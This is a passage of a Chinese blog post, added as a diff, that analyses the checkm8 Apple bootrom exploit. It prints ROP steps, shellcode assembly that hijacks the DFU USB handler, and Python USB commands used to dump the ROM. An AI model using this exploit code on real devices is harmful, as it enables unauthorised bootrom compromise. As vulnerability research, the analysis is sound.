+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>crauEmu设置PC指针为0x1000055D4，该地址对应while(aborted_list)循环的入口。</p>
+
+<p>X19寄存器设置为0x1800B0800，对应第一个fake usb_device_io_request对象。</p>
+
+<p>fake usb_device_io_request的next指针指向下一个fake usb_device_io_request，保存在X21寄存器中，作为循环变量。</p>
+
+<p>三个hook函数的作用是，执行到特定的地址就触发ret_hook动作。</p>
+
+<p>ret_hook的作用是跳过函数或者某些语句的执行，这里是：</p>
+
+<p>0x10000a4b8 — enter_critical_section 屏幕中断</p>
+
+<p>0x10000a514 — exit_critical_section 恢复中断</p>
+
+<p>0x1820b0610 — disable_wxn_arm64 关闭WXN</p>
+
+<p>这些位置并不影响ROP的往下推进，为了简化过程，选择跳过这些函数。</p>
+
+<p>点击“Initiate”按钮可以看到寄存器的值被设置。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_11.36.32.png" alt="截屏2025-03-11 11.36.32.png" /></p>
+
+<ul>
+  <li>单步观察</li>
+</ul>
+
+<p>usb_core_complete_endpoint_io最终调用了fake usb_device_io_request::callback</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">synopsys_otg_abort_endpoint</span><span class="p">;</span>
+         <span class="n">usb_core_complete_endpoint_io</span><span class="p">;</span>
+				         <span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>停在io_req→callback(io_req)观察，此时栈上面的返回地址为0x1000055D0，是usb_core_complete_endpoint_io函数的while(aborted_list)循环的起始位置。</p>
+
+<p>X0是位于INSECURE_MEMORY的伪造usb_device_io_request对象，</p>
+
+<p>X8是callback指针，指向“f(x)”指令片段。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_14.20.54.png" alt="截屏2025-03-11 14.20.54.png" /></p>
+
+<p>进入“f(x)”指令片段，X0 = 0x1800b0600， X10 = t8010_dc_civac，</p>
+
+<p>等效于t8010_dc_civac(0x1800b0600)。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_14.34.15.png" alt="截屏2025-03-11 14.34.15.png" /></p>
+
+<p>运行到“f(x)”指令的结束部分，返回地址出栈，保存到X30寄存器，</p>
+
+<p>ret之后返回到synopsys_otg_abort_endpoint函数的while(aborted_list)循环，进行下一条gadget的执行，这样就避免了free一个损坏的堆块引发panic。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_14.41.21.png" alt="截屏2025-03-11 14.41.21.png" /></p>
+
+<ul>
+  <li>ROP结束状态</li>
+</ul>
+
+<p>X10 = 0x1800B0000，保存t8010_shellcode，通过B指令跳转过去执行。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_14.55.10.png" alt="截屏2025-03-11 14.55.10.png" /></p>
+
+<h1 id="shellcode执行">shellcode执行</h1>
+
+<ol>
+  <li>shellcode的结构</li>
+</ol>
+
+<p>shellcode的构造函数如下：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">t8010_handler</span> <span class="o">=</span> <span class="nf">asm_arm64_x7_trampoline</span><span class="p">(</span><span class="n">t8010_handle_interface_request</span><span class="p">)</span> <span class="o">+</span> \
+								<span class="nf">asm_arm64_branch</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> \
+								<span class="nf">prepare_shellcode</span><span class="p">(</span><span class="sh">'</span><span class="s">usb_0xA1_2_arm64</span><span class="sh">'</span><span class="p">,</span> <span class="n">constants_usb_t8010</span><span class="p">)[</span><span class="mi">4</span><span class="p">:]</span>
+								
+<span class="n">t8010_shellcode</span> <span class="o">=</span> <span class="nf">prepare_shellcode</span><span class="p">(</span><span class="sh">'</span><span class="s">checkm8_arm64</span><span class="sh">'</span><span class="p">,</span> <span class="n">constants_checkm8_t8010</span><span class="p">)</span>
+
+<span class="n">t8010_shellcode</span> <span class="o">=</span> <span class="n">t8010_shellcode</span> <span class="o">+</span> \
+									<span class="sh">'</span><span class="se">\0</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="n">PAYLOAD_OFFSET_ARM64</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">t8010_shellcode</span><span class="p">))</span> <span class="o">+</span> \
+									<span class="n">t8010_handler</span>
+</code></pre></div></div>
+
+<p>shellcode短小精悍，使用1024字节实现了USB序列号修改、劫持USB处理句柄、把USB功能代码拷贝到BOOT_TRAMPOLINE内存区域、USB功能代码这4个功能。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%BA%AFshellcode.jpg" alt="checkm8-纯shellcode.jpg" /></p>
+
+<ol>
+  <li>恢复USB配置描述符</li>
+</ol>
+
+<p>SecureROM初始化阶段为2个USB配置描述符在堆上分配空间，地址分别保存在usb_core_hs_configuration_descriptor和usb_core_fs_configuration_descriptor两个全局变量中。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="n">u_int8_t</span> <span class="o">*</span><span class="n">usb_core_hs_configuration_descriptor</span><span class="p">;</span>
+<span class="k">static</span> <span class="n">u_int8_t</span> <span class="o">*</span><span class="n">usb_core_fs_configuration_descriptor</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">usb_core_start</span><span class="p">(){</span>
+		<span class="p">......</span>
+    <span class="n">usb_core_hs_configuration_descriptor</span> <span class="o">=</span> <span class="p">(</span><span class="n">u_int8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">total_len</span><span class="p">);</span>
+    <span class="n">usb_core_fs_configuration_descriptor</span> <span class="o">=</span> <span class="p">(</span><span class="n">u_int8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">total_len</span><span class="p">);</span>
+    <span class="p">......</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>两个全局变量在内存中的位置相邻，位于0x180088A30和0x180088A38。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_19.42.26.png" alt="截屏2025-03-11 19.42.26.png" /></p>
+
+<p>在控制流劫持过程中，覆盖usb_device_io_request对象的同时，也破坏了堆上面的hs_configuration和fs_configuration对象。这两个对象的内容在编译时确定，因此可以把原有的内容手动复制回去。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">text</span>
+<span class="p">.</span><span class="n">set</span> <span class="n">gUSBDescriptors</span><span class="p">,</span>              <span class="mh">0x180088A30</span>
+
+<span class="n">LDR</span>  <span class="n">X0</span><span class="p">,</span> <span class="o">=</span><span class="n">gUSBDescriptors</span>
+<span class="n">LDP</span>  <span class="n">X0</span><span class="p">,</span> <span class="n">X1</span><span class="p">,</span> <span class="p">[</span><span class="n">X0</span><span class="p">]</span>   <span class="c1">//X0 = usb_core_hs_configuration_descriptor, X1=usb_core_fs_configuration_descriptor</span>
+<span class="n">ADR</span>  <span class="n">X2</span><span class="p">,</span> <span class="n">USB_DESCRIPTOR</span>
+<span class="n">LDP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span> <span class="p">[</span><span class="n">X2</span><span class="p">]</span>       <span class="c1">//恢复usb_core_hs_configuration_descriptor和usb_core_fs_configuration_descriptor</span>
+<span class="n">STP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span> <span class="p">[</span><span class="n">X0</span><span class="p">]</span>       <span class="c1">//一共32字节</span>
+<span class="n">STP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span> <span class="p">[</span><span class="n">X1</span><span class="p">]</span>
+<span class="n">LDP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span> <span class="p">[</span><span class="n">X2</span><span class="p">,</span><span class="err">#</span><span class="mh">0x10</span><span class="p">]</span>
+<span class="n">STP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span> <span class="p">[</span><span class="n">X0</span><span class="p">,</span><span class="err">#</span><span class="mh">0x10</span><span class="p">]</span>
+<span class="n">STP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span> <span class="p">[</span><span class="n">X1</span><span class="p">,</span><span class="err">#</span><span class="mh">0x10</span><span class="p">]</span>
+
+<span class="n">USB_DESCRIPTOR</span><span class="o">:</span>
+<span class="p">.</span><span class="n">word</span> <span class="mh">0x190209</span><span class="p">,</span> <span class="mh">0x80050101</span><span class="p">,</span> <span class="mh">0x409fa</span><span class="p">,</span> <span class="mh">0x1fe0000</span><span class="p">,</span> <span class="mh">0x21070000</span><span class="p">,</span> <span class="mh">0xa01</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0x0</span>
+</code></pre></div></div>
+
+<ol>
+  <li>”     PWND:[checkm8]“</li>
+</ol>
+
+<p>首先找到序列号字符串的结束符，再把” PWND:[checkm8]”字符串拷贝到原始序列号末尾，得到新的序列号字符串。</p>
+
+<p>调用usb_create_string_descriptor(gUSBSerialNumber)生成新的序列号描述符。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">text</span>
+<span class="p">.</span><span class="n">pool</span>
+<span class="p">.</span><span class="n">set</span> <span class="n">gUSBSerialNumber</span><span class="p">,</span>             <span class="mh">0x180083CF8</span>
+<span class="p">.</span><span class="n">set</span> <span class="n">usb_create_string_descriptor</span><span class="p">,</span> <span class="mh">0x10000D150</span>
+<span class="p">.</span><span class="n">set</span> <span class="n">gUSBSRNMStringDescriptor</span><span class="p">,</span>     <span class="mh">0x1800805DA</span>
+
+ 	<span class="n">LDR</span>  <span class="n">X0</span><span class="p">,</span> <span class="o">=</span><span class="n">gUSBSerialNumber</span>
+<span class="n">find_zero_loop</span><span class="o">:</span>
+  <span class="n">ADD</span>  <span class="n">X0</span><span class="p">,</span> <span class="n">X0</span><span class="p">,</span> <span class="err">#</span><span class="mi">1</span>
+  <span class="n">LDRB</span> <span class="n">W1</span><span class="p">,</span> <span class="p">[</span><span class="n">X0</span><span class="p">]</span>
+  <span class="n">CBNZ</span> <span class="n">W1</span><span class="p">,</span> <span class="n">find_zero_loop</span> <span class="c1">//找到序列号的结束符\x00</span>
+
+  <span class="n">ADR</span>  <span class="n">X1</span><span class="p">,</span> <span class="n">PWND_STRING</span>
+  <span class="n">LDP</span>  <span class="n">X2</span><span class="p">,</span> <span class="n">X3</span><span class="p">,</span> <span class="p">[</span><span class="n">X1</span><span class="p">]</span>
+  <span class="n">STP</span>  <span class="n">X2</span><span class="p">,</span> <span class="n">X3</span><span class="p">,</span> <span class="p">[</span><span class="n">X0</span><span class="p">]</span>       <span class="c1">//把" PWND:[checkm8]"字符串拷贝到原始序列号末尾</span>
+
+  <span class="n">LDR</span>  <span class="n">X0</span><span class="p">,</span> <span class="o">=</span><span class="n">gUSBSerialNumber</span>
+  <span class="n">LDR</span>  <span class="n">X1</span><span class="p">,</span> <span class="o">=</span><span class="n">usb_create_string_descriptor</span>
+  <span class="n">BLR</span>  <span class="n">X1</span>         <span class="c1">//usb_create_string_descriptor(gUSBSerialNumber)，返回下标</span>
+
+  <span class="n">LDR</span>  <span class="n">X1</span><span class="p">,</span> <span class="o">=</span><span class="n">gUSBSRNMStringDescriptor</span> <span class="c1">//usb_core_device_descriptor.iSerialNumber</span>
+  <span class="n">STRB</span> <span class="n">W0</span><span class="p">,</span> <span class="p">[</span><span class="n">X1</span><span class="p">]</span>   <span class="c1">//把新的序列号描述符下标保存到usb_core_device_descriptor.iSerialNumber字段</span>
+									<span class="c1">//以上我们就能在设备管理器中看到iphone设备的序列号末尾被加上了" PWND:[checkm8]"</span>
+
+<span class="n">PWND_STRING</span><span class="o">:</span>
+<span class="p">.</span><span class="n">asciz</span> <span class="s">" PWND:[checkm8]"</span>
+</code></pre></div></div>
+
+<p>usb_create_string_descriptor函数把生成的序列号描述符保存在usb_core_string_descriptor全局数组中，返回数组下标。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_20.17.25.png" alt="截屏2025-03-11 20.17.25.png" /></p>
+
+<p>最后把数组下标设置到全局对象usb_core_device_descriptor的iSerialNumber字段，篡改后的序列号就对外可见了。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%AC%AC_15_%E9%A1%B5%201.jpg" alt="checkm8-第 15 页.jpg" /></p>
+
+<p>主机端查看USB设备信息，发现iPhone设备的序列号被修改了。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-06_20.00.32.png" alt="截屏2025-03-06 20.00.32.png" /></p>
+
+<ol>
+  <li>劫持USB报文处理句柄</li>
+</ol>
+
+<p>全局对象usb_dfu_interface_instance的handle_request指向的函数实现了USB DFU协议栈，负责处理主机发送的bmRequestType=0x21的Setup Transaction。</p>
+
+<p>shellcode通过将handle_request函数指针覆盖为攻击者自定义的函数即可劫持对DFU请求的处理。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%AC%AC_15_%E9%A1%B5%202.jpg" alt="checkm8-第 15 页.jpg" /></p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_20.36.08.png" alt="截屏2025-03-11 20.36.08.png" /></p>
+
+<p>shellcode把usb_dfu_interface_instance.handle_request覆盖为0x1800AFC18，该地址位于BOOT_TRAMPOLINE内存区域，经过前面关闭WXN操作之后具有RWX权限。</p>
+
+<p>shellcode中绿色部分是攻击者自定义的USB功能代码，将被拷贝到0x1800AFC18开始的区域。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">text</span>
+
+<span class="p">.</span><span class="n">pool</span>
+<span class="p">.</span><span class="n">set</span> <span class="n">PAYLOAD_OFFSET</span><span class="p">,</span>               <span class="mi">384</span>
+<span class="p">.</span><span class="n">set</span> <span class="n">PAYLOAD_SIZE</span><span class="p">,</span>                 <span class="mi">576</span>
+<span class="p">.</span><span class="n">set</span> <span class="n">PAYLOAD_DEST</span><span class="p">,</span>                 <span class="mh">0x1800AFC00</span>
+<span class="p">.</span><span class="n">set</span> <span class="n">PAYLOAD_PTR</span><span class="p">,</span>                  <span class="mh">0x180088B48</span>
+  
+  <span class="n">LDR</span>  <span class="n">X0</span><span class="p">,</span> <span class="o">=</span><span class="n">PAYLOAD_DEST</span>    <span class="c1">//0x1800AFC00</span>
+  <span class="n">ADR</span>  <span class="n">X1</span><span class="p">,</span> <span class="n">_main</span>
+  <span class="n">LDR</span>  <span class="n">X2</span><span class="p">,</span> <span class="o">=</span><span class="n">PAYLOAD_OFFSET</span>  <span class="c1">//384</span>
+  <span class="n">ADD</span>  <span class="n">X1</span><span class="p">,</span> <span class="n">X1</span><span class="p">,</span> <span class="n">X2</span>           <span class="c1">//X1 就是蓝色和绿色阶段的起始地址</span>
+  <span class="n">MOV</span>  <span class="n">X2</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
+  <span class="n">LDR</span>  <span class="n">X3</span><span class="p">,</span> <span class="o">=</span><span class="n">PAYLOAD_SIZE</span>    <span class="c1">//576</span>
+  <span class="n">LDR</span>  <span class="n">X4</span><span class="p">,</span> <span class="o">=</span><span class="n">PAYLOAD_PTR</span>     <span class="c1">//0x180088B48，usb_dfu_interface_instance.handle_request函数指针</span>
+  <span class="n">ADD</span>  <span class="n">X5</span><span class="p">,</span> <span class="n">X0</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x18</span>        <span class="c1">//绿色部分，处理usb报文格式，从usb_0xA1_2_arm64.S的LDRH W2, [X0]开始执行</span>
+  <span class="n">STR</span>  <span class="n">X5</span><span class="p">,</span> <span class="p">[</span><span class="n">X4</span><span class="p">]</span>             <span class="c1">//覆盖usb_dfu_interface_instance.handle_request函数指针，劫持usb数据包处理句柄</span>
+                            <span class="c1">//usb数据包被导向绿色部分</span>
+</code></pre></div></div>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%BA%AFshellcode.jpg" alt="checkm8-纯shellcode.jpg" /></p>
+
+<ol>
+  <li>拷贝USB功能代码</li>
+</ol>
+
+<p>shellcode中的蓝色和绿色部分被拷贝到BOOT_TRAMPOLINE内存区域。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">copy_loop:</span>
+  <span class="n">LDP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span>  <span class="p">[</span><span class="n">X1</span><span class="p">]</span>        <span class="c1">//把蓝色和绿色阶段拷贝到0x1800AFC00 tramploit页面</span>
+  <span class="n">STP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span>  <span class="p">[</span><span class="n">X0</span><span class="p">]</span>        <span class="c1">//X0 = 0x1800AFC00 其中前0x18字节是蓝色阶段，绿色阶段是usb处理句柄</span>
+  <span class="n">LDP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span>  <span class="p">[</span><span class="n">X1</span><span class="p">,</span><span class="err">#</span><span class="mh">0x10</span><span class="p">]</span>
+  <span class="n">STP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span>  <span class="p">[</span><span class="n">X0</span><span class="p">,</span><span class="err">#</span><span class="mh">0x10</span><span class="p">]</span>
+  <span class="n">LDP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span>  <span class="p">[</span><span class="n">X1</span><span class="p">,</span><span class="err">#</span><span class="mh">0x20</span><span class="p">]</span>
+  <span class="n">STP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span>  <span class="p">[</span><span class="n">X0</span><span class="p">,</span><span class="err">#</span><span class="mh">0x20</span><span class="p">]</span>
+  <span class="n">LDP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span>  <span class="p">[</span><span class="n">X1</span><span class="p">,</span><span class="err">#</span><span class="mh">0x30</span><span class="p">]</span>
+  <span class="n">STP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span>  <span class="p">[</span><span class="n">X0</span><span class="p">,</span><span class="err">#</span><span class="mh">0x30</span><span class="p">]</span>
+  <span class="n">DC</span>   <span class="n">CIVAC</span><span class="p">,</span> <span class="n">X0</span>            <span class="c1">//清除X0指向的内存地址的缓存</span>
+  <span class="n">DMB</span>  <span class="n">SY</span>                   <span class="c1">//屏障指令</span>
+  <span class="n">ADD</span>  <span class="n">X0</span><span class="p">,</span> <span class="n">X0</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x40</span>        <span class="c1">//dst += 0x40</span>
+  <span class="n">ADD</span>  <span class="n">X1</span><span class="p">,</span> <span class="n">X1</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x40</span>        <span class="c1">//src += 0x40</span>
+  <span class="n">ADD</span>  <span class="n">X2</span><span class="p">,</span> <span class="n">X2</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x40</span>        <span class="c1">//count += 0x40</span>
+  <span class="n">CMP</span>  <span class="n">X2</span><span class="p">,</span> <span class="n">X3</span>               <span class="c1">//如果count &lt; size，向前跳转</span>
+  <span class="n">B</span><span class="p">.</span><span class="n">CC</span> <span class="n">copy_loop</span>
+</code></pre></div></div>
+
+<p>47000058E0001FD6是“LDR X7, [PC, #8]; BR X7”汇编指令的机器码。</p>
+
+<p>0x17FFFFFC是“B #-10”汇编指令的机器码。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-shellcode%E5%8C%85%E5%90%ABusb%E5%8A%9F%E8%83%BD%E4%BB%A3%E7%A0%81.jpg" alt="checkm8-shellcode包含usb功能代码.jpg" /></p>
+
+<p>完成代码拷贝后清空流水线，确保CPU能正确加载运行USB功能代码。</p>
+
+<p>最后返回SecureROM，shellcode的任务完成。</p>
+
+<p>后面设备一旦接收到USB DFU数据包，便会被劫持到攻击者自定义的代码中，实现各种功能，例如把SecureROM整个dump出来、把iPhone设备的安全性降级等等。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">SYS</span>  <span class="err">#</span><span class="mi">0</span><span class="p">,</span> <span class="n">c7</span><span class="p">,</span> <span class="n">c5</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>       <span class="c1">//IC IALLUIS，修改代码或加载新代码后，确保所有核心使用最新的指令，而不是旧的缓存指令。</span>
+ <span class="n">DSB</span>  <span class="n">SY</span>                   <span class="c1">//屏障指令</span>
+ <span class="n">ISB</span>                       <span class="c1">//清空处理器流水线，确保后续指令从内存中重新加载</span>
+                            <span class="c1">//3条指令通常组合使用，确保在多核系统中内存和指令缓存的一致性</span>
+ <span class="n">LDP</span>  <span class="n">X29</span><span class="p">,</span> <span class="n">X30</span><span class="p">,</span> <span class="p">[</span><span class="n">SP</span><span class="p">],</span><span class="err">#</span><span class="mh">0x10</span> <span class="c1">//返回SecureROM</span>
+ <span class="n">RET</span>
+</code></pre></div></div>
+
+<h1 id="功能扩展">功能扩展</h1>
+
+<ol>
+  <li>自定义USB报文处理句柄</li>
+</ol>
+
+<p>上面提到，shellcode把usb_dfu_interface_instance.handle_request覆盖为0x1800AFC18。该指针原来指向handle_interface_request函数，实现了DFU下载功能。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">handle_interface_request</span><span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_request</span> <span class="o">*</span><span class="n">request</span><span class="p">,</span> 
+								<span class="kt">uint8_t</span> <span class="o">**</span><span class="n">out_buffer</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>bmRequestType=0xa1且bRequest=2是攻击者自定义的恶意功能指令。</p>
+
+<p>若收到的是正常的DFU数据包，则通过0x1800AC000 ~ 0x1800AC014这段跳板代码路由到正常的处理逻辑，把数据包交给handle_interface_request函数处理。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_08.16.25.png" alt="截屏2025-03-12 08.16.25.png" /></p>
+
+<ol>
+  <li>对正常DFU报文的处理</li>
+</ol>
+
+<p>以—dump-rom参数的实现为例子，主机首先向设备发送正常的DFU请求，其中bmRequestType=0x21， bRequest=1。该请求经过跳板代码路由到handle_interface_request函数处理。其中data参数包含了将要dump的地址范围，设备接收到data参数之后保存在0x1800B0000。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send_data</span><span class="p">(</span><span class="n">device</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="c1">#print 'Sending 0x%x of data to device.' % len(data)
+</span>    <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+        <span class="n">amount</span> <span class="o">=</span> <span class="nf">min</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">-</span> <span class="n">index</span><span class="p">,</span> <span class="n">MAX_PACKET_SIZE</span><span class="p">)</span>
+        <span class="k">assert</span> <span class="n">device</span><span class="p">.</span><span class="nf">ctrl_transfer</span><span class="p">(</span><span class="mh">0x21</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">index</span><span class="p">:</span><span class="n">index</span> <span class="o">+</span> <span class="n">amount</span><span class="p">],</span> <span class="mi">5000</span><span class="p">)</span> <span class="o">==</span> <span class="n">amount</span>
+        <span class="n">index</span> <span class="o">+=</span> <span class="n">amount</span>
+</code></pre></div></div>
+
+<ol>
+  <li>对攻击指令的处理</li>
+</ol>
+
+<p>接着主机向设备发送恶意功能指令，其中bmRequestType=0xa1，bRequest=2，wValue=0xFFFF，该数据包交给USB功能代码处理。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">response</span> <span class="o">=</span> <span class="n">device</span><span class="p">.</span><span class="nf">ctrl_transfer</span><span class="p">(</span><span class="mh">0xA1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0xFFFF</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">response_length</span><span class="p">,</span> \
+						<span class="n">CMD_TIMEOUT</span><span class="p">).</span><span class="nf">tostring</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>若wValue=0xFFFF，</p>
+
+<p>从0x1800B0000读取保存的参数，根据参数的前8个字节判断要执行的指令。</p>
+
+<p>—dump-rom的magic是“memcmemc”。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">STP</span>  <span class="n">X29</span><span class="p">,</span> <span class="n">X30</span><span class="p">,</span> <span class="p">[</span><span class="n">SP</span><span class="p">,</span><span class="err">#</span><span class="o">-</span><span class="mh">0x10</span><span class="p">]</span><span class="o">!</span>   <span class="p">;</span> <span class="err">保存</span><span class="n">fp</span> <span class="err">、</span><span class="n">lr</span>
+<span class="n">MOV</span>  <span class="n">X29</span><span class="p">,</span> <span class="n">SP</span>
+<span class="n">STP</span>  <span class="n">X20</span><span class="p">,</span> <span class="n">X19</span><span class="p">,</span> <span class="p">[</span><span class="n">SP</span><span class="p">,</span><span class="err">#</span><span class="o">-</span><span class="mh">0x10</span><span class="p">]</span><span class="o">!</span>
+
+<span class="n">MOV</span>  <span class="n">X19</span><span class="p">,</span> <span class="n">X0</span>            <span class="p">;</span> <span class="n">usb_device_request</span>
+<span class="n">LDR</span>  <span class="n">X20</span><span class="p">,</span> <span class="o">=</span><span class="n">LOAD_ADDRESS</span> <span class="p">;</span> <span class="mh">0x1800B0000</span><span class="p">,</span> <span class="err">全局指针</span><span class="n">image_buffer</span><span class="err">，</span>
+												<span class="p">;</span><span class="err">在正常情况下保存接收到的</span><span class="n">dfu</span><span class="err">镜像</span><span class="p">,</span> <span class="err">系统被劫持后保存攻击者请求参数</span>
+<span class="n">MOV</span>  <span class="n">W1</span><span class="p">,</span> <span class="err">#</span><span class="mh">0xFFFF</span>
+<span class="n">LDRH</span> <span class="n">W2</span><span class="p">,</span> <span class="p">[</span><span class="n">X19</span><span class="p">,</span><span class="err">#</span><span class="mi">2</span><span class="p">]</span>       <span class="p">;</span><span class="k">if</span><span class="p">(</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">wValue</span> <span class="o">!=</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="k">goto</span> <span class="n">request_done</span>
+<span class="n">CMP</span>  <span class="n">W1</span><span class="p">,</span> <span class="n">W2</span>
+<span class="n">BNE</span>  <span class="n">request_done</span>       <span class="p">;</span> <span class="err">如果</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">wValue</span> <span class="o">==</span> <span class="mh">0xffff</span><span class="p">,</span> <span class="err">那就执行功能代码</span>
+
+<span class="n">LDR</span>  <span class="n">X0</span><span class="p">,</span> <span class="p">[</span><span class="n">X20</span><span class="p">]</span>          <span class="p">;</span> <span class="n">X0</span> <span class="o">=</span> <span class="n">LOAD_ADDRESS</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="err">取出</span><span class="n">magic</span> <span class="n">number</span><span class="p">,</span> <span class="err">判断是哪条命令</span>
+</code></pre></div></div>
+
+<p>—dump-rom调用自定义的memcpy函数，把固件代码段拷贝到0x1800B0000，并且在头部加上“donedone”字符串表示成功执行。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span> <span class="o">--</span><span class="n">dump</span><span class="o">-</span><span class="n">rom</span><span class="err">功能的实现</span>
+
+<span class="n">STR</span>  <span class="n">XZR</span><span class="p">,</span> <span class="p">[</span><span class="n">X20</span><span class="p">]</span>     
+
+<span class="n">LDP</span>  <span class="n">X0</span><span class="p">,</span> <span class="n">X1</span><span class="p">,</span> <span class="p">[</span><span class="n">X20</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x10</span><span class="p">]</span>    <span class="p">;</span> <span class="n">X0</span><span class="o">=</span><span class="n">dest</span><span class="p">,</span> <span class="n">X1</span><span class="o">=</span><span class="n">src</span>
+<span class="n">LDR</span>  <span class="n">X2</span><span class="p">,</span> <span class="p">[</span><span class="n">X20</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x20</span><span class="p">]</span>        <span class="p">;</span> <span class="n">X2</span><span class="o">=</span><span class="n">length</span>
+<span class="n">BL</span>   <span class="n">memcpy</span>
+
